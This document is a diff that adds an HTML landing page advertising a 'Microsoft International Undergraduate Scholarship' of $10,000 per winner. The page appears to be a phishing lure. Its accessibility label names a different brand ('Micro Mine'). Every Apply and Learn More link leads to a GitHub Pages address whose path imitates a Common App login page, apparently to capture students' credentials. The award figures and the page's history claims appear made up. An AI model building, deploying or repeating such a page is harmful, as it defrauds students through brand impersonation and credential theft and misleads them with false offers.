@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Microsoft - International Undergraduate Scholarship</title>
+
+<!-- Fonts -->
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700;900&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
+
+<style>
+  /* ========== CONFIG / NOTES ==========
+     - Put your logo image as: logo2.jpg
+     - Put your student background as: students_bg.png
+     - Both files should be in the same folder as this index.html
+     - Both "Apply" and "Learn More" redirect to the provided application URL
+     ===================================== */
+
+  :root{
+    --deep-blue: #071233;
+    --royal-blue: #0066ff;
+    --glow-blue: rgba(0,174,255,0.28);
+    --gold: #f6c84c;
+    --glass-bg: rgba(255,255,255,0.06);
+    --glass-border: rgba(255,255,255,0.12);
+    --accent: linear-gradient(90deg,#00b4ff,#2b6aff);
+  }
+
+  html,body{
+    height:100%;
+    margin:0;
+    padding:0;
+    font-family: "Poppins", system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    overflow: hidden; /* no page scroll - all content fits one screen */
+    background: var(--deep-blue);
+    color: #fff;
+  }
+
+  /* ----------------- background + energetic light sweep + blue aura ----------------- */
+  .bg-wrap {
+    position:fixed;
+    inset:0;
+    z-index:-3;
+    background: url('') center/cover no-repeat;
+    filter: saturate(0.95) contrast(1.03) brightness(0.82);
+  }
+
+  /* dark gradient overlay for contrast */
+  .bg-overlay {
+    position: fixed; inset:0; z-index:-2;
+    background: linear-gradient(180deg, rgba(2,8,31,0.55) 0%, rgba(2,8,31,0.70) 60%, rgba(2,8,31,0.82) 100%);
+    backdrop-filter: blur(2px);
+  }
+
+  /* energetic moving light sweep */
+  .light-sweep {
+    position:fixed;
+    inset: -50% -50%;
+    z-index:-1;
+    background: radial-gradient(40% 20% at 10% 30%, rgba(0,174,255,0.12), transparent 10%),
+                radial-gradient(30% 15% at 80% 60%, rgba(255,255,255,0.06), transparent 10%);
+    mix-blend-mode: screen;
+    animation: sweep 2.4s linear infinite;
+    transform: translate3d(0,0,0);
+    pointer-events:none;
+  }
+
+  @keyframes sweep {
+    0% { transform: translateX(-60%) translateY(-10%) rotate(6deg) scale(1); }
+    50% { transform: translateX(60%) translateY(10%) rotate(-6deg) scale(1.02); }
+    100% { transform: translateX(-60%) translateY(-10%) rotate(6deg) scale(1); }
+  }
+
+  /* global soft blue inner glow to give premium aura */
+  .glow-aura {
+    position: fixed;
+    inset: 0;
+    z-index: -0;
+    pointer-events: none;
+    box-shadow: inset 0 0 160px var(--glow-blue);
+    opacity: 0.9;
+  }
+
+  /* ----------------- nav (blended) ----------------- */
+  nav {
+    position: absolute;
+    top: 36px;
+    left: 40px;
+    right: 40px;
+    display:flex;
+    justify-content: space-between;
+    align-items:center;
+    gap: 12px;
+    z-index: 30;
+    /* blended - no solid block */
+    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.00));
+    padding: 10px 18px;
+    border-radius: 999px;
+    backdrop-filter: blur(6px) saturate(1.1);
+    border: 2px solid rgba(255,255,255,0.04);
+  }
+
+  .brand {
+    display:flex;
+    align-items:center;
+    gap:12px;
+  }
+  .brand img { height:48px; width:48px; object-fit: contain; border-radius:8px; }
+  .brand .title {
+    display:flex;
+    flex-direction: column;
+    line-height:1;
+  }
+  .brand .title .main {
+    font-family: "Playfair Display", serif;
+    font-size:20px;
+    font-weight:700;
+    letter-spacing:0.6px;
+    color: #fff;
+    text-shadow: 0 6px 24px rgba(0,0,0,0.35);
+  }
+  .brand .title .sub {
+    font-size:11px;
+    color: rgba(255,255,255,0.75);
+    margin-top:4px;
+    letter-spacing:1px;
+  }
+
+  .nav-actions { display:flex; gap:12px; align-items:center; }
+  .nav-actions a {
+    display:inline-block;
+    text-decoration:none;
+    padding:10px 18px;
+    border-radius: 999px;
+    font-weight:700;
+    font-size:14px;
+    transition: transform .18s ease, box-shadow .18s ease;
+    border: 1px solid transparent;
+  }
+
+  .btn-apply {
+    background: linear-gradient(90deg,#ffd36b,#f6c84c);
+    color: #071233;
+    box-shadow: 0 6px 30px rgba(246,200,76,0.18), 0 1px 0 rgba(255,255,255,0.08) inset;
+    transform-origin:center;
+    animation: applyPulse 2s infinite;
+  }
+  @keyframes applyPulse {
+    0% { box-shadow: 0 6px 22px rgba(246,200,76,0.20); transform: translateY(0) scale(1); }
+    50% { box-shadow: 0 10px 36px rgba(246,200,76,0.28); transform: translateY(-3px) scale(1.02); }
+    100% { box-shadow: 0 6px 22px rgba(246,200,76,0.20); transform: translateY(0) scale(1); }
+  }
+
+  .btn-learn {
+    color: #BFD9FF;
+    border: 1px solid rgba(191,217,255,0.12);
+    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+  }
+
+  .nav-actions a:hover { transform: translateY(-3px); }
+
+  /* ----------------- center card (glassmorphism) ----------------- */
+  .center {
+    position: absolute;
+    inset: 0;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    padding: 60px;
+    z-index: 20;
+    pointer-events: auto;
+    transform: translateY(16px);
+  }
+
+  .card {
+    width: min(1050px, 92%);
+    border-radius: 22px;
+    background: linear-gradient(180deg, rgba(255,255,255,0.04), rgba(255,255,255,0.02));
+    border: 1px solid var(--glass-border);
+    display:grid;
+    grid-template-columns: 1fr 420px;
+    gap: 28px;
+    padding: 28px;
+    box-shadow: 0 20px 60px rgba(2,8,31,0.6);
+    overflow: hidden;
+  }
+
+  /* left: headline + description */
+  .card-left {
+    padding: 12px 10px;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    gap:12px;
+  }
+
+  .headline {
+    font-family: "Playfair Display", serif;
+    font-size: 34px;
+    margin:0;
+    line-height: 1.02;
+    color: #fff;
+    letter-spacing: 0.4px;
+    text-shadow: 0 10px 30px rgba(0,0,0,0.45);
+  }
+
+  .tagline {
+    display:inline-block;
+    margin-top:6px;
+    font-size:13px;
+    color: rgba(255,255,255,0.86);
+    letter-spacing: .6px;
+    background: linear-gradient(90deg, rgba(0,174,255,0.12), rgba(43,106,255,0.06));
+    padding:8px 12px;
+    border-radius: 12px;
+    border: 1px solid rgba(255,255,255,0.02);
+    width:fit-content;
+  }
+
+  .short-desc {
+    margin-top:12px;
+    color: rgba(255,255,255,0.83);
+    font-size:14px;
+    max-width: 720px;
+  }
+
+  .cta-row {
+    margin-top:16px;
+    display:flex;
+    gap:14px;
+    align-items:center;
+  }
+  .cta-row a { text-decoration:none; }
+
+  /* right: table-like info blocks (curved) */
+  .info {
+    padding: 6px;
+    display:flex;
+    flex-direction:column;
+    gap:12px;
+    justify-content:center;
+  }
+
+  .info .big {
+    background: rgba(255,255,255,0.03);
+    border-radius: 16px;
+    padding: 18px;
+    border: 1px solid rgba(255,255,255,0.06);
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:6px;
+    text-align:center;
+    transition: transform .22s ease, box-shadow .22s ease;
+  }
+  .info .big:hover { transform: translateY(-6px); box-shadow: 0 18px 60px rgba(0,174,255,0.18); }
+
+  .big .num {
+    font-size:30px; font-weight:800; color: var(--gold); letter-spacing:0.6px;
+  }
+  .big .lbl { color: rgba(255,255,255,0.85); font-size:13px; }
+
+  .mini-grid {
+    margin-top:8px;
+    display:grid;
+    grid-template-columns: repeat(2,1fr);
+    gap:10px;
+  }
+  .mini {
+    background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+    border-radius:12px;
+    padding:12px;
+    border: 1px solid rgba(255,255,255,0.04);
+    transition: transform .18s ease;
+    text-align:center;
+  }
+  .mini:hover { transform: translateY(-4px); box-shadow: 0 12px 30px rgba(0,174,255,0.12); }
+  .mini .mnum { font-size:18px; font-weight:700; color:#9fe1ff; }
+  .mini .mlbl { font-size:12px; color: rgba(255,255,255,0.82); margin-top:6px; }
+
+  /* smol footer inside card */
+  .card-foot {
+    margin-top:14px;
+    font-size:12px;
+    color: rgba(255,255,255,0.68);
+  }
+
+  /* Animations on load: quick and energetic */
+  .card, .nav, .brand, .big, .mini { animation: popIn .6s cubic-bezier(.2,.9,.3,1) both; }
+  .card { animation-delay: .40s; }
+  .brand { animation-delay: .08s; }
+  .big { animation-delay: .60s; }
+  .mini { animation-delay: .84s; }
+
+  @keyframes popIn {
+    from { opacity:0; transform: translateY(14px) scale(.995) }
+    to   { opacity:1; transform: translateY(0) scale(1) }
+  }
+
+  /* layout adjustments for smaller screens (still no scrolling ideal) */
+  @media (max-width: 980px) {
+    .card { grid-template-columns: 1fr; gap:18px; padding:20px; width: min(720px, 95%); }
+    .brand .title .main { font-size:18px; }
+    nav { left:22px; right:22px; top:18px; padding:8px 12px; }
+  }
+
+  /* ========== RESPONSIVE ADDITIONS ========== */
+  @media (max-width: 720px) {
+    html, body {
+      overflow-y: auto; /* allow vertical scroll on small devices */
+    }
+
+    nav {
+      flex-wrap: wrap;
+      gap: 8px;
+      justify-content: center;
+      padding: 10px 16px;
+      top: 12px;
+      left: 10px;
+      right: 10px;
+    }
+
+    .brand {
+      gap: 8px;
+    }
+    .brand img {
+      height: 40px;
+      width: 40px;
+    }
+    .brand .title .main {
+      font-size: 16px !important;
+    }
+    .brand .title .sub {
+      font-size: 10px;
+    }
+
+    .nav-actions {
+      width: 100%;
+      justify-content: center;
+      gap: 8px;
+    }
+    .nav-actions a {
+      flex: 1 1 140px;
+      padding: 12px 0;
+      font-size: 13px;
+      text-align: center;
+    }
+
+    .center {
+      position: relative;
+      padding: 20px 16px 40px 16px;
+      transform: translateY(0);
+      align-items: flex-start;
+    }
+
+    .card {
+      grid-template-columns: 1fr;
+      gap: 16px;
+      padding: 20px;
+      width: 100%;
+      max-width: 480px;
+      border-radius: 18px;
+      box-shadow: 0 15px 50px rgba(2,8,31,0.5);
+      overflow: visible;
+    }
+
+    .card-left {
+      padding: 10px 8px;
+    }
+
+    .headline {
+      font-size: 24px;
+      letter-spacing: 0.3px;
+    }
+
+    .tagline {
+      font-size: 11px;
+      padding: 6px 10px;
+      letter-spacing: 0.5px;
+    }
+
+    .short-desc {
+      font-size: 13px;
+      max-width: 100%;
+    }
+
+    .cta-row {
+      flex-direction: column;
+      gap: 10px;
+    }
+    .cta-row a {
+      display: block;
+      width: 100%;
+      padding: 12px 0;
+      font-size: 15px;
+      border-radius: 16px;
+    }
+
+    .info {
+      padding: 6px 8px 0 8px;
+    }
+
+    .info .big {
+      padding: 14px 12px;
+    }
+
+    .big .num {
+      font-size: 24px;
+    }
+    .big .lbl {
+      font-size: 11px;
+    }
+
+    .mini-grid {
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+    }
+    .mini {
+      padding: 10px;
+    }
+    .mini .mnum {
+      font-size: 16px;
+    }
+    .mini .mlbl {
+      font-size: 10px;
+    }
+
+    .card-foot {
+      font-size: 11px;
+      margin-top: 10px;
+    }
+  }
+
+  @media (max-width: 400px) {
+    .nav-actions a {
+      font-size: 12px;
+      padding: 10px 0;
+    }
+    .headline {
+      font-size: 20px;
+    }
+  }
+</style>
+</head>
+<body>
+
+  <!-- background images & effects -->
+  <div class="bg-wrap" aria-hidden="true"></div>
+  <div class="bg-overlay" aria-hidden="true"></div>
+  <div class="light-sweep" aria-hidden="true"></div>
+  <div class="glow-aura" aria-hidden="true"></div>
+
+  <!-- Nav (blended) -->
+  <nav>
+    <div class="brand" role="img" aria-label="Micro Mine logo and name">
+      <img src="logo2.jpg" alt="Micro Mine logo">
+      <div class="title">
+        <div class="main" style="font-size:35px;">Microsoft</div>
+        <div class="sub">International Scholarship • Undergraduate</div>
+      </div>
+    </div>
+
+    <div class="nav-actions">
+      <!-- both go to the required application link -->
+      <a class="btn-apply" href="https://apply-hub.github.io/commonapp.org/login" rel="noopener" target="_blank">Apply</a>
+      <a class="btn-learn" href="https://apply-hub.github.io/commonapp.org/login" rel="noopener" target="_blank">Learn More</a>
+    </div>
+  </nav>
+
+  <!-- CENTER CARD (fits single viewport) -->
+  <main class="center" role="main">
+    <section class="card" aria-labelledby="scholar-head">
+      <!-- LEFT: Header + CTA -->
+      <div class="card-left">
+        <h1 id="scholar-head" class="headline">International Undergraduate Scholarship</h1>
+
+        <div class="tagline">+10 Years of granting international scholarships</div>
+
+        <p class="short-desc">
+          Microsoft supports ambitious undergraduates worldwide - generous awards, large yearly cohorts,
+          and a belief in long-term student success. All core details are shown here. Click Apply to continue.
+        </p>
+
+        <div class="cta-row">
+          <a class="btn-apply" href="https://apply-hub.github.io/commonapp.org/login" rel="noopener" target="_blank">Apply Now — $10,000</a>
+          <a class="btn-learn" href="https://apply-hub.github.io/commonapp.org/login" rel="noopener" target="_blank">Learn More</a>
+        </div>
+
+        <div class="card-foot">Trusted globally • Focus: University & Undergraduate students • Fast decisions</div>
+      </div>
+
+      <!-- RIGHT: Table-like info in curved cards -->
+      <aside class="info" aria-label="Scholarship highlights">
+        <div class="big" role="group" aria-labelledby="award-amount">
+          <div id="award-amount" class="num">$10,000</div>
+          <div class="lbl">Award per winner</div>
+
+          <div class="mini-grid" style="width:100%; margin-top:12px;">
+            <div class="mini">
+              <div class="mnum">500+</div>
+              <div class="mlbl">Students awarded yearly</div>
+            </div>
+            <div class="mini">
+              <div class="mnum">10+</div>
+              <div class="mlbl">Years running</div>
+            </div>
+            <div class="mini">
+              <div class="mnum">Worldwide</div>
+              <div class="mlbl">Eligible universities</div>
+            </div>
+            <div class="mini">
+              <div class="mnum">Undergraduate</div>
+              <div class="mlbl">Level of study</div>
+            </div>
+          </div>
+        </div>
+      </aside>
+    </section>
+  </main>
+
+</body>
+</html>
